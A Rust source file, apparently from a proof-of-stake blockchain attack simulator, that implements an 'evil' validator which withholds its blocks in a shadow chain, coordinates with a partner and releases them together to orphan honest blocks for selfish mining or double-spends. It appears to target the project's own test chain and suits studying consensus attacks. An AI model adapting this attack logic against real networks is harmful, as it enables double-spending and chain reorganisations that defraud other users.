//! Evil Proposer - Modified block proposer for 51% attacks
//!
//! Instead of broadcasting blocks immediately, stores them in a shadow chain
//! and releases them strategically to orphan honest validators' blocks.

use anyhow::{Result, anyhow};
use chrono::Utc;
use node_lib::{BLOCKCHAIN, NODES};
use poslib::crypto::{PrivateKey, PublicKey, Signature};
use poslib::network::Message;
use poslib::sha256::Hash;
use poslib::types::{Block, BlockHeader, Blockchain, Transaction, TransactionOutput};
use poslib::util::MerkleRoot;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use tokio::sync::RwLock;
use tokio::time::Duration;
use uuid::Uuid;

use crate::attack_coordinator::AttackCoordinator;
use crate::cli::AttackMode;
use crate::shadow_chain::ShadowChain;

/// Statistics for the evil validator
#[derive(Debug, Default)]
pub struct EvilStats {
    pub blocks_mined_secretly: u64,
    pub blocks_released: u64,
    pub blocks_orphaned: u64,
    pub double_spends_attempted: u64,
    pub double_spends_successful: u64,
    pub attack_releases: u64,
}

pub struct EvilProposer {
    private_key: PrivateKey,
    public_key: PublicKey,
    blocks_proposed: AtomicU64,

    // Evil-specific fields
    pub shadow_chain: Arc<RwLock<ShadowChain>>,
    pub attack_mode: AttackMode,
    pub release_threshold: u64,
    pub network_delay_ms: u64,
    pub stats: Arc<RwLock<EvilStats>>,
    pub coordinator: Option<Arc<AttackCoordinator>>,
}

impl EvilProposer {
    pub fn new(
        private_key: PrivateKey,
        attack_mode: AttackMode,
        release_threshold: u64,
        network_delay_ms: u64,
        coordinator: Option<Arc<AttackCoordinator>>,
    ) -> Self {
        let public_key = private_key.public_key();
        Self {
            private_key,
            public_key,
            blocks_proposed: AtomicU64::new(0),
            shadow_chain: Arc::new(RwLock::new(ShadowChain::new())),
            attack_mode,
            release_threshold,
            network_delay_ms,
            stats: Arc::new(RwLock::new(EvilStats::default())),
            coordinator,
        }
    }

    pub fn public_key(&self) -> &PublicKey {
        &self.public_key
    }

    /// Check if it's our turn to propose a block (slot-based)
    pub fn is_our_turn(&self, blockchain: &Blockchain) -> bool {
        // Use slot-based validator selection for consistency with consensus
        blockchain.is_slot_for_proposal(&self.public_key)
    }

    /// Get the current slot
    pub fn current_slot(&self, blockchain: &Blockchain) -> u64 {
        blockchain.current_slot()
    }

    /// Initialize shadow chain from current blockchain state
    pub async fn init_shadow_chain(&self) {
        let blockchain = BLOCKCHAIN.read().await;
        let tip_hash = blockchain
            .blocks()
            .last()
            .map(|b| b.hash())
            .unwrap_or(Hash::zero());
        let height = blockchain.block_height();

        let mut shadow = self.shadow_chain.write().await;
        shadow.fork_from(tip_hash, height);

        println!("👿 Shadow chain initialized at height {}", height);
    }

    /// Evil block proposal - mines secretly based on attack mode
    /// NOTE: In PoS with slots, we can only mine when it's our turn!
    pub async fn propose_block_evil(&self) -> Result<()> {
        // First check if it's actually our turn
        let is_our_turn = {
            let blockchain = BLOCKCHAIN.read().await;
            self.is_our_turn(&blockchain)
        };

        if !is_our_turn {
            println!("👿 Not our turn - cannot mine this slot");
            return Ok(());
        }

        match self.attack_mode {
            AttackMode::PrivateChain => self.propose_private_chain().await,
            AttackMode::SelfishMining => self.propose_selfish().await,
            AttackMode::DoubleSpend => self.propose_private_chain().await, // Same mining, different release
            AttackMode::Observer => {
                println!("👁️  Observer mode - watching only");
                Ok(())
            }
        }
    }

    /// Private chain attack - mine secretly, release when ahead
    /// In PoS: We mine on top of public chain but don't broadcast
    async fn propose_private_chain(&self) -> Result<()> {
        // Build block on top of the REAL blockchain (not shadow chain)
        // because validator selection depends on prev_hash
        let block = self.build_real_block().await?;
        let block_hash = block.hash();
        let slot = block.header.slot;

        // Add to our own blockchain (validates it)
        {
            let mut blockchain = BLOCKCHAIN.write().await;
            if let Err(e) = blockchain.add_block(block.clone()) {
                println!("👿 Failed to add our evil block: {:?}", e);
                return Err(anyhow!("Block rejected: {:?}", e));
            }
            blockchain.rebuild_utxos();
            
            // Register for consensus but we won't broadcast attestations from others
            let _ = blockchain.propose_block(&block);
        }

        // Store in shadow chain for tracking (not for building)
        {
            let mut shadow = self.shadow_chain.write().await;
            shadow.add_shadow_block(block.clone());

            let mut stats = self.stats.write().await;
            stats.blocks_mined_secretly += 1;
        }

        // Share with partner if coordinating
        if let Some(coordinator) = &self.coordinator {
            let _ = coordinator.share_block(block.clone()).await;

            let shadow = self.shadow_chain.read().await;
            let _ = coordinator
                .send_status(shadow.len() as u64, shadow.fork_point_hash())
                .await;
        }

        println!(
            "👿 Secretly mined block at slot {} (withheld: {})",
            slot,
            self.shadow_chain.read().await.len()
        );

        // DON'T broadcast to peers - that's the attack!
        // We wait until we have enough blocks ahead

        // Check if we should release all withheld blocks
        self.check_and_release().await?;

        Ok(())
    }

    /// Build a real block (on actual blockchain, not shadow chain)
    async fn build_real_block(&self) -> Result<Block> {
        let blockchain = BLOCKCHAIN.read().await;

        if !self.is_our_turn(&blockchain) {
            return Err(anyhow!("Not our turn to propose"));
        }

        let current_slot = blockchain.current_slot();

        // Get transactions from mempool
        let mempool_txs: Vec<Transaction> = blockchain
            .mempool()
            .iter()
            .take(poslib::BLOCK_TRANSACTION_CAP)
            .map(|(_, tx)| tx.clone())
            .collect();

        // Calculate fees
        let mut validator_fees = 0u64;
        let mut valid_transactions = Vec::new();

        for tx in mempool_txs {
            let mut input_sum = 0u64;
            let mut output_sum = 0u64;
            let mut is_valid = true;

            for input in &tx.inputs {
                if let Some((_, output)) =
                    blockchain.utxos().get(&input.prev_transaction_output_hash)
                {
                    input_sum += output.value;
                } else {
                    is_valid = false;
                    break;
                }
            }

            if !is_valid {
                continue;
            }

            for output in &tx.outputs {
                output_sum += output.value;
            }

            if input_sum >= output_sum {
                validator_fees += input_sum - output_sum;
                valid_transactions.push(tx);
            }
        }

        // Create coinbase
        let coinbase = Transaction {
            inputs: vec![],
            outputs: vec![TransactionOutput {
                pubkey: self.public_key.clone(),
                unique_id: Uuid::new_v4(),
                value: validator_fees,
                is_stake: false,
                locked_until: 0,
            }],
        };

        let mut transactions = vec![coinbase];
        transactions.extend(valid_transactions);

        let merkle_root = MerkleRoot::calculate(&transactions);

        let prev_hash = blockchain
            .blocks()
            .last()
            .map(|b| b.hash())
            .unwrap_or(Hash::zero());

        let header = BlockHeader::new_with_slot(
            Utc::now(),
            prev_hash,
            merkle_root,
            self.public_key.clone(),
            current_slot,
        );

        let signature = Signature::sign_output(&header.hash(), &self.private_key);

        Ok(Block::new(header, transactions, signature))
    }

    /// Selfish mining - withhold blocks strategically
    /// In PoS: same as private chain, we mine when it's our turn but don't broadcast
    async fn propose_selfish(&self) -> Result<()> {
        // In PoS, selfish mining works the same as private chain
        // We mine when it's our turn but withhold blocks
        self.propose_private_chain().await
    }

    /// Build a block for the shadow chain
    async fn build_shadow_block(&self) -> Result<Block> {
        let blockchain = BLOCKCHAIN.read().await;
        let current_slot = blockchain.current_slot();
        
        // Get transactions from mempool
        let mempool_txs: Vec<Transaction> = blockchain
            .mempool()
            .iter()
            .take(poslib::BLOCK_TRANSACTION_CAP)
            .map(|(_, tx)| tx.clone())
            .collect();

        drop(blockchain);

        // Build the block using shadow chain's tip with current slot
        let mut shadow = self.shadow_chain.write().await;
        let block = shadow.build_shadow_block(
            &self.private_key, 
            &self.public_key, 
            mempool_txs,
            current_slot,
        )?;

        Ok(block)
    }

    /// Check if we should release the shadow chain
    /// In PoS: we release when we have enough withheld blocks
    async fn check_and_release(&self) -> Result<()> {
        let shadow = self.shadow_chain.read().await;
        let withheld_count = shadow.len() as u64;
        drop(shadow);

        // Release when we've withheld enough blocks
        let should_release = withheld_count >= self.release_threshold;

        // Also check if partner triggered release
        let partner_triggered = if let Some(coordinator) = &self.coordinator {
            coordinator.is_release_triggered().await
        } else {
            false
        };

        if should_release {
            println!("👿 Withheld {} blocks, threshold is {} - RELEASING!", 
                withheld_count, self.release_threshold);
            self.release_attack().await?;
        } else if partner_triggered {
            println!("👿 Partner triggered release!");
            self.release_attack().await?;
        }

        Ok(())
    }

    /// RELEASE THE KRAKEN! 🐙
    /// Broadcast our secretly mined blocks to the network
    /// In PoS mode: blocks are already in our chain, we just broadcast them
    pub async fn release_attack(&self) -> Result<()> {
        // Check if our fork point has been finalized (attack would fail)
        let finalized_height = {
            let blockchain = BLOCKCHAIN.read().await;
            blockchain.finalized_height()
        };
        
        let fork_height = self.shadow_chain.read().await.fork_point_height();
        
        if fork_height < finalized_height {
            println!("\n\x1b[33m⚠️  ATTACK BLOCKED BY CONSENSUS!\x1b[0m");
            println!("   Fork point height {} is already finalized ({})", fork_height, finalized_height);
            println!("   Cannot revert finalized blocks - attack aborted!");
            
            // Reinitialize shadow chain from current tip
            self.init_shadow_chain().await;
            return Ok(());
        }

        println!("\n👿💥 RELEASING ATTACK! 💥👿\n");

        // Notify partner
        if let Some(coordinator) = &self.coordinator {
            let _ = coordinator.trigger_release().await;
        }

        // Get the blocks we withheld (they're already in our chain)
        let mut shadow = self.shadow_chain.write().await;
        let blocks = shadow.release_all();
        let num_blocks = blocks.len();
        drop(shadow);

        if num_blocks == 0 {
            println!("👿 No blocks to release!");
            return Ok(());
        }

        // Simulate network delay for realism
        if self.network_delay_ms > 0 {
            tokio::time::sleep(Duration::from_millis(self.network_delay_ms)).await;
        }

        // Broadcast ALL withheld blocks to ALL peers (the attack!)
        // These blocks are already valid in our chain, other nodes should accept them
        println!("👿 Broadcasting {} withheld blocks...", num_blocks);
        
        for block in &blocks {
            self.broadcast_block(block.clone()).await?;

            // Small delay between blocks to simulate network propagation
            if self.network_delay_ms > 0 {
                tokio::time::sleep(Duration::from_millis(self.network_delay_ms / 10)).await;
            }
        }

        // Update stats
        {
            let mut stats = self.stats.write().await;
            stats.blocks_released += num_blocks as u64;
            stats.attack_releases += 1;
        }

        println!("👿 Released {} blocks to the network!", num_blocks);
        println!("   If honest nodes have blocks at the same heights, they should be orphaned!");

        // Reinitialize shadow chain for next attack
        self.init_shadow_chain().await;

        Ok(())
    }

    /// Release just one block (for selfish mining)
    async fn release_one_block(&self) -> Result<()> {
        let mut shadow = self.shadow_chain.write().await;
        let blocks = shadow.release_all();

        if let Some(block) = blocks.into_iter().next() {
            drop(shadow);

            // Add to our chain
            {
                let mut blockchain = BLOCKCHAIN.write().await;
                blockchain.add_block(block.clone())?;
                blockchain.rebuild_utxos();
            }

            // Broadcast
            self.broadcast_block(block).await?;

            let mut stats = self.stats.write().await;
            stats.blocks_released += 1;

            // Reinit shadow chain
            self.init_shadow_chain().await;
        }

        Ok(())
    }

    /// Broadcast a block to all connected peers
    async fn broadcast_block(&self, block: Block) -> Result<()> {
        let message = Message::NewBlock(block);

        let nodes: Vec<String> = NODES.iter().map(|x| x.key().clone()).collect();

        let mut success_count = 0;

        for node in &nodes {
            if let Some(mut stream) = NODES.get_mut(node) {
                if message.send_async(&mut *stream).await.is_ok() {
                    success_count += 1;
                }
            }
        }

        println!(
            "📡 Block broadcast to {}/{} peers",
            success_count,
            nodes.len()
        );

        Ok(())
    }

    /// Normal proposal (for fallback or testing)
    pub async fn propose_block_normal(&self) -> Result<()> {
        let block = {
            let blockchain = BLOCKCHAIN.read().await;

            if !self.is_our_turn(&blockchain) {
                return Err(anyhow!("Not our turn to propose"));
            }

            let mempool_txs: Vec<Transaction> = blockchain
                .mempool()
                .iter()
                .take(poslib::BLOCK_TRANSACTION_CAP)
                .map(|(_, tx)| tx.clone())
                .collect();

            let validator_fees: u64 = 0; // Simplified

            let coinbase = Transaction {
                inputs: vec![],
                outputs: vec![TransactionOutput {
                    pubkey: self.public_key.clone(),
                    unique_id: Uuid::new_v4(),
                    value: validator_fees,
                    is_stake: false,
                    locked_until: 0,
                }],
            };

            let mut transactions = vec![coinbase];
            transactions.extend(mempool_txs);

            let merkle_root = MerkleRoot::calculate(&transactions);
            let prev_hash = blockchain
                .blocks()
                .last()
                .map(|b| b.hash())
                .unwrap_or(Hash::zero());

            let header =
                BlockHeader::new(Utc::now(), prev_hash, merkle_root, self.public_key.clone());
            let signature = Signature::sign_output(&header.hash(), &self.private_key);

            Block::new(header, transactions, signature)
        };

        // Add to chain and broadcast normally
        {
            let mut blockchain = BLOCKCHAIN.write().await;
            blockchain.add_block(block.clone())?;
            blockchain.rebuild_utxos();
        }

        self.broadcast_block(block).await?;
        self.blocks_proposed.fetch_add(1, Ordering::SeqCst);

        Ok(())
    }

    /// Get current statistics
    pub async fn get_stats(&self) -> EvilStats {
        self.stats.read().await.clone()
    }
}

impl Clone for EvilStats {
    fn clone(&self) -> Self {
        Self {
            blocks_mined_secretly: self.blocks_mined_secretly,
            blocks_released: self.blocks_released,
            blocks_orphaned: self.blocks_orphaned,
            double_spends_attempted: self.double_spends_attempted,
            double_spends_successful: self.double_spends_successful,
            attack_releases: self.attack_releases,
        }
    }
}
